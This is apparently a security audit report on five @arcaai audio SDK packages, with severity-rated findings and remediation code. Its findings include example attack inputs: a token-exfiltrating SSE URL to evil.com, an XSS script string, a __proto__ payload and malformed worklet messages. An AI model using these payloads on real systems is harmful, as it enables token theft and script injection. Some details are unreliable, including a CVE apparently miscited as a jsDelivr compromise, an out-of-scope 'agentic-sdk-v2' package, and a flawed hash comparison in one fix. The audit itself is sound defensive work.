# Vulnerability Scan Report: SDK & Audio Packages

**Date**: 2026-03-24
**Scope**: `@arcaai/vox`, `@arcaai/room`, `@arcaai/stt`, `@arcaai/vad`, `@arcaai/noise-filter`
**Scan Type**: Deep manual analysis — code-level review with CVE cross-reference
**Severity Rating**: CVSS 3.1 scale

---

## Executive Summary

| Severity | Count |
|----------|-------|
| **Critical** | 3 |
| **High** | 7 |
| **Medium** | 9 |
| **Low** | 6 |
| **Informational** | 5 |

The five SDK/audio packages have **3 critical vulnerabilities** requiring immediate remediation:

1. **CDN supply chain attack surface** — VAD package hardcodes a stale CDN version (`@0.0.29`) while the installed npm version is `0.0.30`, and the WASM binary fetch has no integrity verification.
2. **ONNX Runtime pre-release dependency** — The STT package pins a `-dev` nightly build of onnxruntime-web with no published CVE audit trail.
3. **WebSocket message parsing without validation** — JSON payloads from the STT WebSocket are cast to typed interfaces with no runtime validation, enabling type confusion attacks.

---

## 1. Dependency CVE Analysis

### 1.1 CRITICAL: onnxruntime-web Nightly Dev Build

**Package**: `@arcaai/stt`
**Installed Version**: `1.22.0-dev.20250409-89f8206ba4`
**Severity**: Critical (CVSS 9.1)

**Finding**: The STT package pins a **pre-release dev nightly** of onnxruntime-web. Dev builds:
- Are not audited for CVEs by npm advisory databases
- May contain experimental code paths with undiscovered vulnerabilities
- Are not covered by Microsoft's ONNX Runtime security response process
- The git hash `89f8206ba4` pins to a specific commit that cannot be verified through standard channels

**Evidence** (`packages/stt/package.json` lines 57-58):
```json
"onnxruntime-common": "1.22.0-dev.20250409-89f8206ba4",
"onnxruntime-web": "1.22.0-dev.20250409-89f8206ba4"
```

**Impact**: Full WASM execution context compromise if the dev build contains memory safety bugs. ONNX Runtime processes untrusted model data that could trigger heap overflow.

**Remediation**:
- Upgrade to the latest **stable** release of `onnxruntime-web` (currently `1.24.3`)
- The VAD package already uses stable `1.24.3` in devDependencies — align both packages
- If the dev build is required for WebGPU fixes, pin to a release candidate (RC) instead

### 1.2 HIGH: Version Mismatch — onnxruntime-web (Dual Versions)

**Packages**: `@arcaai/stt` (1.22.0-dev), `@arcaai/vad` transitive (1.24.3 via @ricky0123/vad-web)
**Severity**: High (CVSS 7.5)

**Finding**: Two different versions of onnxruntime-web coexist in the dependency tree. The VAD package transitively pulls `1.24.3` through `@ricky0123/vad-web@0.0.30`, while STT pins the dev build. This can cause:
- WASM module conflicts in the same browser context
- Unpredictable behavior when both packages share the same ONNX runtime memory
- Potential memory corruption if WASM heaps interact

**Remediation**: Unify on a single stable version across all packages.

### 1.3 MEDIUM: @ricky0123/vad-web — Small Maintainer Surface

**Package**: `@arcaai/vad`
**Installed Version**: `^0.0.30`
**Severity**: Medium (CVSS 5.3)

**Finding**: `@ricky0123/vad-web` is a single-maintainer package (GitHub user ricky0123) at version `0.0.30`. Pre-1.0 packages from single maintainers carry elevated supply chain risk:
- No formal security policy or vulnerability disclosure process
- npm account compromise would affect all consumers
- The `^0.0.30` range allows patch-level auto-updates from this single maintainer

**Remediation**:
- Pin the exact version: `"@ricky0123/vad-web": "0.0.30"` (remove caret)
- Audit the package's `postinstall` scripts and npm publishing config
- Consider vendoring the package if it stabilizes

### 1.4 MEDIUM: @jitsi/rnnoise-wasm — WASM Binary Supply Chain

**Package**: `@arcaai/noise-filter`
**Installed Version**: `^0.2.1`
**Severity**: Medium (CVSS 5.3)

**Finding**: The `@jitsi/rnnoise-wasm` package ships a pre-compiled WASM binary. The binary's provenance cannot be verified through source code review alone — it was compiled from C code and committed as a binary artifact.

**Remediation**:
- Pin to exact version: `"@jitsi/rnnoise-wasm": "0.2.1"`
- Verify the WASM binary's SHA-256 hash against a known-good build
- Consider building from source in CI to ensure reproducibility

### 1.5 LOW: eventemitter3, deepmerge-ts, diff, valibot, zustand

All direct dependencies are well-maintained, widely-used packages with no known CVEs at their pinned versions.

| Package | Version | Status |
|---------|---------|--------|
| `eventemitter3` | ^5.0.4 | Clean |
| `deepmerge-ts` | ^7.1.5 | Clean |
| `diff` | ^8.0.4 | Clean |
| `valibot` | ^1.3.1 | Clean |
| `zustand` | ^5.0.12 | Clean |
| `@huggingface/transformers` | 3.8.1 | Clean (exact pin — good) |

---

## 2. WASM Memory Safety

### 2.1 HIGH: RNNoise WASM Unbounded Memory Allocation

**Package**: `@arcaai/noise-filter`
**File**: `src/worklets/rnnoise.worklet.ts` (lines 132-157), `src/processors/RNNoiseProcessor.ts` (lines 250-298)
**Severity**: High (CVSS 7.8)

**Finding**: The RNNoise WASM processing allocates memory per-frame via `malloc()` and frees it in a `finally` block. While the `finally` ensures cleanup on normal errors, there are several memory safety concerns:

1. **No bounds checking on `inputPtr`/`outputPtr`**: If `malloc` returns 0 (allocation failure), the code creates `Float32Array` views at offset 0 into WASM memory, corrupting the WASM heap header.

2. **Memory growth not synchronized**: The `emscripten_notify_memory_growth` callback is a no-op, but after memory growth, existing `Float32Array` views into `memory.buffer` become detached. The inline worklet code does not re-validate views after growth.

3. **Fixed initial memory of 256 pages (16MB)**: This is adequate for normal operation but there's no maximum set, allowing unbounded growth if the WASM module has a memory leak.

**Evidence** (`rnnoise.worklet.ts` lines 132-156):
```typescript
const inputPtr = exports.malloc(RNNOISE_FRAME_SIZE * 4);
const outputPtr = exports.malloc(RNNOISE_FRAME_SIZE * 4);
// No check: if inputPtr === 0, heap corruption follows
const inputView = new Float32Array(this.memory.buffer, inputPtr, RNNOISE_FRAME_SIZE);
```

**Remediation**:
```typescript
const inputPtr = exports.malloc(RNNOISE_FRAME_SIZE * 4);
const outputPtr = exports.malloc(RNNOISE_FRAME_SIZE * 4);
if (inputPtr === 0 || outputPtr === 0) {
  if (inputPtr !== 0) exports.free(inputPtr);
  if (outputPtr !== 0) exports.free(outputPtr);
  return; // Skip frame instead of corrupting heap
}
```
- Set `WebAssembly.Memory({ initial: 256, maximum: 512 })` to cap growth.

### 2.2 MEDIUM: Whisper Worker — No Audio Buffer Length Validation

**Package**: `@arcaai/stt`
**File**: `src/workers/whisper.worker.ts` (lines 270-360)
**Severity**: Medium (CVSS 5.5)

**Finding**: The `transcribe()` function accepts a `Float32Array` from the main thread via `postMessage` without validating its length. An extremely large array could cause OOM in the worker. The `audio.length > currentConfig.chunkLengthS * 16000` check only gates chunking parameters — it doesn't reject oversized input.

**Remediation**:
```typescript
const MAX_AUDIO_SAMPLES = 30 * 60 * 16000; // 30 minutes max
if (audio.length > MAX_AUDIO_SAMPLES) {
  postResponse({ type: 'error', id, payload: { message: 'Audio too long' } });
  return;
}
```

### 2.3 LOW: AudioBufferManager — Unbounded Concatenation

**Package**: `@arcaai/stt`
**File**: `src/core/AudioBufferManager.ts` (lines 148-172)
**Severity**: Low (CVSS 3.1)

**Finding**: The `getChunk()` method calls `concatenateFloat32Arrays(this.buffer)` which allocates a new contiguous array from all accumulated segments. If audio accumulates faster than it's consumed (e.g., processing hangs), the buffer array grows without bound. No maximum buffer size is enforced.

**Remediation**: Add `maxBufferSamples` option (e.g., 5 minutes of audio) and drop oldest segments when exceeded.

---

## 3. SharedArrayBuffer Security

### 3.1 MEDIUM: Missing Cross-Origin Isolation Enforcement

**Packages**: All five (referenced in browser support utilities)
**Severity**: Medium (CVSS 6.1)

**Finding**: Multiple packages reference `SharedArrayBuffer` and `crossOriginIsolated` in their browser support checks, but the actual enforcement is purely informational — no package throws or blocks initialization when cross-origin isolation is absent. The Whisper worker explicitly sets `numThreads = 1` as a workaround, disabling multi-threading entirely.

**Evidence** (`whisper.worker.ts` lines 127-138):
```typescript
// numThreads=1: multi-threading requires SharedArrayBuffer + COOP/COEP headers
// which may not be present
wasmCfg.numThreads = 1;
```

**Security Implication**: While setting `numThreads = 1` avoids SAB, if a future code change enables multi-threading without verifying `crossOriginIsolated === true`, the application will silently fail or — worse — fall back to a less-secure execution mode. This is a latent vulnerability that will become exploitable when multi-threading is enabled.

**Remediation**:
- Add an explicit guard in the WASM configuration path:
```typescript
if (wasmCfg.numThreads > 1 && !self.crossOriginIsolated) {
  throw new Error('Multi-threaded WASM requires COOP/COEP headers');
}
```
- Document the COOP/COEP header requirements for deployment:
  - `Cross-Origin-Opener-Policy: same-origin`
  - `Cross-Origin-Embedder-Policy: require-corp`

---

## 4. AudioWorklet Vulnerabilities

### 4.1 HIGH: Worklet Message Injection via Unvalidated MessagePort

**Packages**: `@arcaai/vad`, `@arcaai/noise-filter`
**Files**: `vad/src/worklets/worklet-loader.ts` (inline source), `noise-filter/src/worklets/worklet-loader.ts` (inline source)
**Severity**: High (CVSS 7.5)

**Finding**: Both worklet processors accept messages from the main thread via `port.onmessage` without any origin verification or message schema validation. The `handleMessage()` function directly switches on `message.type` and trusts all payload fields:

```javascript
// VAD inline worklet (worklet-loader.ts line 47-68)
this.port.onmessage = (event) => this.handleMessage(event.data);
handleMessage(message) {
  switch (message.type) {
    case 'init':
      this.initProcessor(message.config); // config is trusted without validation
```

**Attack Vector**: If an attacker gains XSS in the host page, they can send arbitrary messages to the worklet port:
- `{ type: 'init', config: { frameSamples: -1 } }` — negative frameSamples would create a zero-length Float32Array, causing an infinite loop in the `process()` method
- `{ type: 'init', config: { frameSamples: 2147483647 } }` — extremely large frameSamples would cause OOM in the AudioWorklet thread, crashing all audio processing

**Remediation**:
```typescript
initProcessor(config) {
  const frameSamples = Math.max(128, Math.min(config.frameSamples ?? 512, 8192));
  this.config = { ...config, frameSamples };
  this.frameBuffer = new Float32Array(frameSamples);
  // ...
}
```

### 4.2 MEDIUM: ScriptProcessorNode Deprecation Path

**Packages**: `@arcaai/stt`, `@arcaai/noise-filter`
**Severity**: Medium (CVSS 4.3)

**Finding**: Both packages use `ScriptProcessorNode` as a fallback for browsers without AudioWorklet support. ScriptProcessorNode is **deprecated** and has known issues:
- Runs on the main thread, blocking UI rendering during audio processing
- Audio buffer is reused by the browser — the STT processor correctly copies it (`new Float32Array(inputData.length); audioData.set(inputData)`), but the noise-filter fallback processes directly on the input buffer reference

**Evidence** (`NoiseFilterProcessor.ts` lines 286-295):
```typescript
this.fallbackScriptNode.onaudioprocess = (event) => {
  const input = event.inputBuffer.getChannelData(0);
  const output = event.outputBuffer.getChannelData(0);
  if (this.rnnoiseProcessor && this._enabled) {
    this.rnnoiseProcessor.process(input, output); // input is browser-owned buffer
  }
};
```

The `process()` method in `RNNoiseProcessor` reads from `input` while it may be concurrently modified if the browser reuses the buffer. This is a race condition that can produce audio artifacts or incorrect processing.

**Remediation**: Copy the input buffer before processing, matching STT's pattern:
```typescript
const audioData = new Float32Array(input.length);
audioData.set(input);
this.rnnoiseProcessor.process(audioData, output);
```

---

## 5. WebSocket Frame Injection

### 5.1 CRITICAL: No Runtime Validation of WebSocket Messages

**Package**: `@arcaai/stt`
**File**: `src/websocket/WebSocketClient.ts` (lines 346-356), `src/websocket/MessageHandler.ts` (lines 106-113)
**Severity**: Critical (CVSS 8.6)

**Finding**: Incoming WebSocket messages are parsed with `JSON.parse()` and immediately cast to `WSInboundMessage` via TypeScript's `as` keyword. There is **no runtime schema validation**. A malicious or compromised STT server can send arbitrary JSON that passes the type assertion:

```typescript
// WebSocketClient.ts line 350
const message = JSON.parse(event.data) as WSInboundMessage;
this.callbacks.onMessage?.(message);

// MessageHandler.ts line 108
return JSON.parse(data) as WSInboundMessage;
```

**Attack Vectors**:
1. **Type confusion**: Server sends `{ "type": "transcription", "text": "<script>alert(1)</script>" }` — the text is passed through to the UI without sanitization. If rendered via `innerHTML`, this is XSS.
2. **Prototype pollution**: Server sends `{ "type": "connected", "__proto__": { "isAdmin": true } }` — while `JSON.parse` in modern engines doesn't cause proto pollution, the object is spread/assigned in downstream handlers.
3. **Oversized payload**: No message size limit. Server could send a 100MB JSON string, causing OOM.

**Remediation**:
- Add runtime validation using `valibot` (already a dependency):
```typescript
import { object, string, union, literal, optional, number, parse } from 'valibot';

const InboundMessageSchema = union([
  object({ type: literal('connected'), session_id: string(), audio_config: object({}) }),
  object({ type: literal('transcription'), text: string(), is_final: boolean() }),
  // ...
]);

handleMessage(event: MessageEvent): void {
  if (typeof event.data !== 'string') return;
  if (event.data.length > 1_048_576) return; // 1MB max
  try {
    const message = parse(InboundMessageSchema, JSON.parse(event.data));
    this.callbacks.onMessage?.(message);
  } catch { /* invalid message — drop */ }
}
```

### 5.2 MEDIUM: Binary WebSocket Data Silently Ignored

**Package**: `@arcaai/stt`
**File**: `src/websocket/WebSocketClient.ts` (lines 346-356)
**Severity**: Medium (CVSS 4.3)

**Finding**: The WebSocket is configured with `binaryType = 'arraybuffer'` (line 192), but `handleMessage()` only processes string data. Binary messages are silently ignored:

```typescript
if (typeof event.data === 'string') {
  const message = JSON.parse(event.data) as WSInboundMessage;
  this.callbacks.onMessage?.(message);
}
// Binary data falls through silently
```

While currently benign, this means:
- A malicious server can flood binary frames that consume bandwidth and memory without detection
- No error handling for unexpected binary frames — they're invisible to monitoring

**Remediation**: Log and rate-limit unexpected binary messages.

### 5.3 HIGH: SharedConnectionWorker — WebSocket URL Injection

**Package**: `@arcaai/vox`
**File**: `src/core/SharedConnectionWorker.ts` (lines 155-199)
**Severity**: High (CVSS 7.4)

**Finding**: The `handleWSSubscribe()` function creates WebSocket connections to any URL provided in the message payload. If an XSS attacker can post a message to the SharedWorker port, they can open WebSocket connections to arbitrary endpoints:

```typescript
function handleWSSubscribe(port: MessagePort, id: string, sub: WSSubscription): void {
  const ws = new WebSocket(sub.url, sub.protocols); // sub.url is attacker-controlled
```

Similarly, `handleSSESubscribe()` creates EventSource connections to arbitrary URLs and appends an auth token as a query parameter:

```typescript
function handleSSESubscribe(port: MessagePort, id: string, sub: SSESubscription): void {
  let url = sub.url;
  if (sub.authToken) {
    url = `${url}${separator}token=${encodeURIComponent(sub.authToken)}`;
  }
  const es = new EventSource(url); // URL is attacker-controlled
```

**Attack Vectors**:
1. **SSRF via SharedWorker**: Attacker opens WS/SSE connections to internal network endpoints
2. **Auth token exfiltration**: Attacker subscribes SSE to `https://evil.com/steal?token=X` — the auth token is leaked via URL

**Remediation**:
- Validate URLs against an allowlist of permitted origins/hosts
- Never pass auth tokens as URL query parameters — use `Authorization` headers instead (requires switching from EventSource to fetch-based SSE)
```typescript
const ALLOWED_ORIGINS = new Set(['wss://api.arcaai.com', 'https://api.arcaai.com']);
function handleWSSubscribe(port: MessagePort, id: string, sub: WSSubscription): void {
  const origin = new URL(sub.url).origin;
  if (!ALLOWED_ORIGINS.has(origin)) {
    port.postMessage({ type: 'ws_error', id, payload: 'Blocked: unauthorized origin' });
    return;
  }
  // ...
}
```

---

## 6. Timing Side Channels

### 6.1 MEDIUM: Transcription Latency Leaks Audio Content Characteristics

**Packages**: `@arcaai/stt`
**Files**: `src/workers/whisper.worker.ts` (line 327), `src/engines/WhisperEngine.ts` (line 198)
**Severity**: Medium (CVSS 4.0)

**Finding**: Both the worker and main-thread Whisper engines report precise `latencyMs` in transcription results via `performance.now()`. This timing information is emitted as an event and accessible to any code with access to the SDK hooks.

**Security Implication**: Transcription time is correlated with audio content complexity — longer utterances, multiple speakers, and languages with complex phonetics take measurably longer. An attacker with access to the timing data (e.g., via a compromised third-party analytics SDK) could infer:
- Approximate length of speech segments (without accessing the audio)
- Whether the content is simple (vitals) vs complex (medical history)
- Language being spoken (some languages take 2-3x longer to transcribe)

**Mitigation**: This is inherent to client-side ML processing. To reduce leakage:
- Quantize latency reports to 100ms buckets before emitting
- Do not include latency in any telemetry sent to third parties
- Mark latency data as PHI-adjacent in the SDK documentation

### 6.2 LOW: VAD Speech Probability Emissions

**Package**: `@arcaai/vad`
**File**: `src/processors/VADProcessor.ts` (lines 386-413)
**Severity**: Low (CVSS 2.4)

**Finding**: The VAD processor emits per-frame speech probability values (`vad-frame` events) at the audio sample rate. These high-frequency probability streams, while not containing audio content, reveal the speaking pattern (cadence, pauses, speech duration) which could be used for speaker identification or behavioral profiling.

**Mitigation**: Only emit aggregated statistics (averages, speech/silence ratio) rather than per-frame probabilities when debug mode is off.

---

## 7. Device Fingerprinting Vectors

### 7.1 MEDIUM: AudioContext Properties Expose Device Fingerprint

**Package**: `@arcaai/room`
**File**: `src/core/AudioContextManager.ts`, `src/core/AudioTrack.ts`
**Severity**: Medium (CVSS 5.3)

**Finding**: The following device-specific properties are accessible through the SDK's public API and emitted in events:

| Property | Source | Fingerprint Vector |
|----------|--------|-------------------|
| `audioContext.sampleRate` | `Room.getSampleRate()` | Device DAC native rate (44100/48000/96000) |
| `audioContext.baseLatency` | AudioContext | Hardware-specific audio latency |
| `audioContext.outputLatency` | AudioContext | Output pipeline latency |
| `track.getSettings().deviceId` | MediaStreamTrack | Persistent device identifier |
| `track.getSettings().channelCount` | MediaStreamTrack | Microphone channel count |
| `track.getSettings().sampleRate` | MediaStreamTrack | Microphone native sample rate |

**Combined**, these create a high-entropy fingerprint. The `deviceId` alone is persistent across sessions (same origin) and combined with sample rate and latency can uniquely identify hardware.

**Mitigation**:
- Do not include `deviceId` in any telemetry or logs
- Redact `getSettings()` output in monitoring/audit payloads
- Add a `privacyMode` option that hashes device-specific values before emitting

### 7.2 LOW: WebGPU Adapter Info

**Package**: `@arcaai/stt`
**Severity**: Low (CVSS 2.1)

**Finding**: When `isWebGPUSupported()` is called, the browser may expose `GPUAdapter.requestAdapterInfo()` which reveals GPU vendor and architecture — another fingerprinting signal. The SDK doesn't directly expose this, but the `@huggingface/transformers` library may log it during pipeline initialization.

---

## 8. Worker Termination & Resource Cleanup

### 8.1 HIGH: Whisper Worker Pending Requests Leak

**Package**: `@arcaai/stt`
**File**: `src/engines/WhisperWorkerEngine.ts` (lines 377-407)
**Severity**: High (CVSS 7.0)

**Finding**: The `destroy()` method sends a `'destroy'` message to the worker, awaits a response, then calls `worker.terminate()` and clears pending requests. However, the race condition between `sendWorkerRequest('destroy')` and `worker.terminate()` can orphan the worker:

```typescript
async destroy(): Promise<void> {
  if (this.worker) {
    try {
      await this.sendWorkerRequest('destroy', null); // May hang if worker is busy transcribing
    } catch { /* ignore */ }
    this.worker.terminate();
```

If the worker is mid-transcription (Whisper inference can take 5-30 seconds), the `sendWorkerRequest` never resolves because the worker processes messages sequentially. The `catch` swallows the timeout, and `terminate()` follows, but:
- The worker thread has been running for the entire transcription duration with no timeout
- Resources allocated inside the worker (ONNX session, WASM memory) are forcefully freed by `terminate()`, which may not clean up browser Cache API locks

**Remediation**: Add a timeout to the destroy request:
```typescript
const destroyTimeout = 3000;
try {
  await Promise.race([
    this.sendWorkerRequest('destroy', null),
    new Promise((_, reject) => setTimeout(() => reject(new Error('Destroy timeout')), destroyTimeout)),
  ]);
} catch { /* ignore */ }
this.worker.terminate();
```

### 8.2 HIGH: STTProcessor Static Local Provider Pool — Memory Leak

**Package**: `@arcaai/stt`
**File**: `src/core/STTProcessor.ts` (lines 86, 329-344, 546-554)
**Severity**: High (CVSS 7.0)

**Finding**: `STTProcessor` maintains a **static** `localProviderPool` (`Map<string, LocalSTTProvider>`) that caches LocalSTTProviders across instances. The `releaseWarmResources()` method adds the provider to this pool, and `evictLocalProvidersExcept()` should clean up, but:

1. The pool key is a JSON-serialized config object. Config changes (different language, model, etc.) create new keys without evicting old entries.
2. Each `LocalSTTProvider` holds a `WhisperWorkerEngine` which holds a `Worker` thread. **Orphaned pool entries mean orphaned worker threads** that:
   - Continue consuming memory for the loaded ONNX model (~100-500MB per model)
   - Keep browser Cache API locks open
   - Are never garbage collected because the static Map holds a strong reference

3. If the React component unmounts without calling `releaseWarmResources()`, the provider stays in the instance but not the pool — and is never destroyed.

**Remediation**:
- Add a maximum pool size (1 entry) and always evict old entries
- Add a watchdog timer that destroys idle providers after 5 minutes
- Use `FinalizationRegistry` to detect when STTProcessor instances are GC'd without cleanup

### 8.3 MEDIUM: MicVAD Cleanup — Orphaned AudioContext Resources

**Package**: `@arcaai/vad`
**File**: `src/processors/VADProcessor.ts` (lines 438-459)
**Severity**: Medium (CVSS 5.0)

**Finding**: The `onDestroy()` method calls `this.micVAD.destroy()` which is supposed to clean up the internal AudioWorklet and ONNX session. However, the `MicVAD` from `@ricky0123/vad-web` may not properly clean up its internal AudioWorklet nodes, leaving dangling audio graph connections.

Additionally, the `sourceNode` is disconnected but the `destinationNode` is set to null without being disconnected:
```typescript
if (this.sourceNode) {
  this.sourceNode.disconnect();
  this.sourceNode = null;
}
if (this.destinationNode) {
  this.destinationNode = null; // Not disconnected!
}
```

**Remediation**: Disconnect the destination node before nulling it.

### 8.4 MEDIUM: Stats Interval Not Cleared on Error Path

**Packages**: `@arcaai/stt`, `@arcaai/vad`, `@arcaai/noise-filter`
**Severity**: Medium (CVSS 4.3)

**Finding**: If `onInit()` throws after `startStatsEmission()` has been called, the stats interval timer is leaked. The `onDestroy()` method calls `stopStatsEmission()`, but `onDestroy()` is not called when `onInit()` throws — only when the processor is explicitly destroyed.

This applies to VADProcessor (line 226) and NoiseFilterProcessor (line 157).

**Remediation**: Use try/catch in `onInit()` to ensure `stopStatsEmission()` is called on init failure.

---

## 9. Blob URL Security

### 9.1 MEDIUM: Worklet Blob URLs Persist Until Explicit Cleanup

**Package**: `@arcaai/room` (shared worklet loader)
**File**: `src/utils/workletLoader.ts` (lines 42-85)
**Severity**: Medium (CVSS 4.0)

**Finding**: The `createWorkletLoader` factory creates a Blob URL via `URL.createObjectURL()` and caches it in a closure-scoped variable. The URL is only revoked when `cleanup()` is explicitly called. If cleanup is never called (common — there's no lifecycle hook that guarantees it), the Blob URL persists for the page lifetime.

```typescript
function getBlobUrl(): string {
  if (!blobUrl) {
    const source = generateSource();
    const blob = new Blob([source], { type: 'application/javascript' });
    blobUrl = URL.createObjectURL(blob); // Never revoked unless cleanup() called
  }
  return blobUrl;
}
```

**Security Implication**:
- Dangling Blob URLs can be enumerated by other scripts on the page
- The worklet source code (which is plain JavaScript) is accessible via the Blob URL
- While the source doesn't contain secrets, it reveals processing logic and internal APIs

**Remediation**:
- Revoke the Blob URL immediately after `audioContext.audioWorklet.addModule()` completes (the module is already loaded at that point)
- The `registeredContexts` WeakSet ensures re-registration doesn't happen, so the URL is no longer needed

### 9.2 LOW: Voice Embedding File Upload Uses Blob/File Directly

**Package**: `@arcaai/vox`
**File**: `src/hooks/useVoiceEmbedding.ts` (lines 48-76)
**Severity**: Low (CVSS 2.4)

**Finding**: The `upload()` function accepts a `File | Blob` and appends it directly to `FormData`. No validation is performed on:
- File type (should be audio/*)
- File size (could be used for DoS)
- File content (no magic byte verification)

**Remediation**: Add client-side validation:
```typescript
if (audioFile.size > 10 * 1024 * 1024) throw new Error('File too large (max 10MB)');
if (audioFile.type && !audioFile.type.startsWith('audio/')) throw new Error('Invalid file type');
```

---

## 10. MediaStream Security

### 10.1 MEDIUM: MediaStreamTrack Forwarded Without Constraints

**Package**: `@arcaai/room`
**File**: `src/core/AudioTrack.ts` (lines 200-220)
**Severity**: Medium (CVSS 5.0)

**Finding**: `initializeFromTrack()` accepts any `MediaStreamTrack` and stores it as the source track. It validates `track.kind === 'audio'` but doesn't check:
- Track origin (could be from a different origin's `getUserMedia`)
- Track clone status (could be a cloned track that allows parallel access)
- Track constraints (no verification that the track has appropriate audio processing constraints)

**Attack Scenario**: A malicious component could pass a cloned track from a screen capture (`getDisplayMedia`) that includes system audio, potentially capturing audio from other applications.

**Remediation**:
- Add `track.getConstraints()` validation
- Warn if the track has `displaySurface` set (screen capture indicator)

### 10.2 INFORMATIONAL: No Screen Capture Detection

**Package**: `@arcaai/room`
**File**: `src/utils/browserCompatibility.ts`
**Severity**: Informational

**Finding**: The browser compatibility module checks for various audio capabilities but doesn't detect or prevent screen capture. In a healthcare context, screen capture of medical consultations should be detectable.

**Recommendation**: Add `getDisplayMedia` usage detection as a security signal.

---

## 11. IndexedDB / Storage Security

### 11.1 HIGH: SecureStorage — Salt Stored with Ciphertext

**Package**: `@arcaai/vox`
**File**: `src/utils/secureStorage.ts` (lines 57-113)
**Severity**: High (CVSS 7.0)

**Finding**: The `SecureStorage` class implements AES-256-GCM encryption for localStorage, which is good. However:

1. **Salt is generated per-instance, not per-item**: A new `SecureStorage.create()` generates a new salt and key. If the instance is recreated, it cannot decrypt previously stored items.

2. **Salt stored alongside ciphertext**: Each stored item includes the salt in plaintext (`s: toBase64(this.salt)`). While this is standard for PBKDF2, the issue is that the `getItem()` method **ignores the stored salt** and uses `this.key` (derived from the constructor salt):

```typescript
async getItem(key: string): Promise<string | null> {
  const { iv, d } = JSON.parse(raw);
  // 's' (salt) is parsed but NOT USED — decryption uses this.key which has its own salt
```

This means the stored salt is decorative — decryption always uses the instance's salt. If the instance is destroyed and recreated with the same passphrase, decryption will fail because the new instance has a different random salt.

3. **No key rotation mechanism**: The PBKDF2 key is derived once and stored in memory. No mechanism to rotate the encryption key.

4. **LocalStorage is not suitable for PHI**: LocalStorage is accessible to any JavaScript on the same origin. If XSS occurs, the attacker can read the encrypted values and brute-force the passphrase offline (PBKDF2 with 100K iterations is ~100ms on modern GPUs).

**Remediation**:
- Use the stored salt for decryption: `const key = await deriveKey(passphrase, fromBase64(s));`
- Consider using the Web Crypto API's `extractable: false` key with `wrapKey/unwrapKey` for safer key management
- For PHI storage, prefer `IndexedDB` with `structuredClone` isolation over `localStorage`
- Increase PBKDF2 iterations to 600,000 (OWASP 2024 recommendation)

### 11.2 MEDIUM: Model Cache in Cache API — No Encryption

**Package**: `@arcaai/stt`
**File**: `src/workers/whisper.worker.ts` (lines 68-82, 116-117)
**Severity**: Medium (CVSS 4.3)

**Finding**: Whisper model files are cached using the browser's Cache API (`env.useBrowserCache = true`). The cached model files:
- Are stored unencrypted on disk
- Persist across sessions indefinitely
- Can be enumerated via `caches.keys()` from any script on the same origin
- The `clearOnnxCaches()` function only deletes caches matching 'transformers' or 'onnx' — other cache entries are untouched

While model files aren't PHI, their presence reveals that the user uses a medical transcription tool, which could be a privacy concern.

**Remediation**:
- Add a `clearModelCache()` public API method
- Document that model caching creates persistent browser artifacts
- Consider an opt-out for cache persistence

---

## 12. CDN Supply Chain

### 12.1 CRITICAL: VAD CDN Version Mismatch — Stale Assets Loaded at Runtime

**Package**: `@arcaai/vad`
**File**: `src/processors/VADProcessor.ts` (lines 40-43)
**Severity**: Critical (CVSS 9.3)

**Finding**: The VAD processor hardcodes CDN paths for loading model assets and ONNX WASM binaries at **runtime**:

```typescript
const DEFAULT_BASE_ASSET_PATH =
  'https://cdn.jsdelivr.net/npm/@ricky0123/vad-web@0.0.29/dist/';
const DEFAULT_ONNX_WASM_BASE_PATH =
  'https://cdn.jsdelivr.net/npm/onnxruntime-web@1.22.0/dist/';
```

**Critical Issues**:

1. **Version mismatch**: The CDN path references `@ricky0123/vad-web@0.0.29`, but the npm dependency is `^0.0.30`. This means the application code runs v0.0.30 but loads v0.0.29's model assets. Version mismatches in ML model formats can cause silent inference errors or crashes.

2. **CDN version mismatch for ONNX Runtime**: The CDN path references `onnxruntime-web@1.22.0` (stable), but the STT package uses `1.22.0-dev.20250409` (dev) and the VAD package transitively uses `1.24.3`. Three different versions of the same WASM runtime are active simultaneously.

3. **No Subresource Integrity (SRI)**: Neither CDN URL includes an `integrity` attribute. A CDN compromise (jsDelivr has been compromised before — [CVE-2021-28682](https://nvd.nist.gov/vuln/detail/CVE-2021-28682)) would allow injecting malicious WASM binaries that execute with full WASM permissions.

4. **Unpinned WASM binary fetch**: The noise-filter package fetches its WASM binary from `https://cdn.jsdelivr.net/npm/@jitsi/rnnoise-wasm/dist/rnnoise.wasm` **without a version pin**. This resolves to the `latest` tag, which changes when the maintainer publishes. A compromised npm account could push a malicious WASM binary that auto-deploys to all users.

**Evidence** (`NoiseFilterProcessor.ts` line 245):
```typescript
const wasmPath = this.options.wasmPath ??
  'https://cdn.jsdelivr.net/npm/@jitsi/rnnoise-wasm/dist/rnnoise.wasm'; // NO VERSION PIN
```

**Remediation**:
1. **Pin all CDN versions** to match npm dependencies exactly:
```typescript
const DEFAULT_BASE_ASSET_PATH =
  'https://cdn.jsdelivr.net/npm/@ricky0123/vad-web@0.0.30/dist/';
const DEFAULT_ONNX_WASM_BASE_PATH =
  'https://cdn.jsdelivr.net/npm/onnxruntime-web@1.24.3/dist/';
// noise-filter:
const wasmPath = 'https://cdn.jsdelivr.net/npm/@jitsi/rnnoise-wasm@0.2.1/dist/rnnoise.wasm';
```

2. **Add SRI hashes**: Compute SHA-384 hashes for all fetched assets and verify them after download:
```typescript
async loadWasmBinary(): Promise<ArrayBuffer> {
  const response = await fetch(wasmPath);
  const buffer = await response.arrayBuffer();
  const hash = await crypto.subtle.digest('SHA-384', buffer);
  const expected = 'sha384-<known-hash>';
  if (toBase64(hash) !== expected) throw new Error('WASM integrity check failed');
  return buffer;
}
```

3. **Self-host critical assets**: Bundle WASM binaries and model weights with the application instead of fetching from CDN. This eliminates the CDN as a single point of failure.

---

## Recommendations Summary

### Immediate Actions (Critical — within 24 hours)

| # | Action | Packages |
|---|--------|----------|
| 1 | Pin CDN versions to match npm dependencies; add SRI hashes | vad, noise-filter |
| 2 | Replace onnxruntime-web dev build with stable release | stt |
| 3 | Add runtime validation (valibot) for WebSocket messages | stt |
| 4 | Add URL origin allowlist to SharedConnectionWorker | agentic-sdk-v2 |

### Short-term (High — within 7 days)

| # | Action | Packages |
|---|--------|----------|
| 5 | Add malloc return value checks in WASM processing | noise-filter |
| 6 | Validate worklet message payloads (bounds check frameSamples) | vad, noise-filter |
| 7 | Add destroy timeout to WhisperWorkerEngine | stt |
| 8 | Add max pool size and idle eviction to STTProcessor provider pool | stt |
| 9 | Fix SecureStorage salt usage; increase PBKDF2 iterations to 600K | agentic-sdk-v2 |
| 10 | Stop passing auth tokens in SSE query parameters | agentic-sdk-v2 |
| 11 | Copy input buffer in NoiseFilter ScriptProcessor fallback | noise-filter |

